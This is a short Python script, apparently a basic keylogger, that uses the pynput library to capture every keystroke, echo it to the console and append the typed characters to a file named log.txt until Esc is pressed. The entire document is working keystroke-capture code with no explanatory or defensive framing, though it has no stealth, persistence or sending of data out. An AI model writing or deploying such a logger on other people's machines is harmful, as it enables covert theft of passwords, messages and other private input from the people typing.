from pynput.keyboard import Key, Listener
keys = []
def on_press(key):
    global keys
    keys.append(key)
    print("{0} pressed".format(key))

    if key == Key.space:
        count = 0
        write_file(keys)
        keys = []

def write_file(keyss):
    with open("log.txt", "a") as f:
        for key in keyss:
            k = str(key).replace("'", "")
            if k.find("space") > 0:
                f.write("\n")
            elif k.find("Key") == -1:
                f.write(k)
def on_release(key):
    if key == Key.esc:
        return False
with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
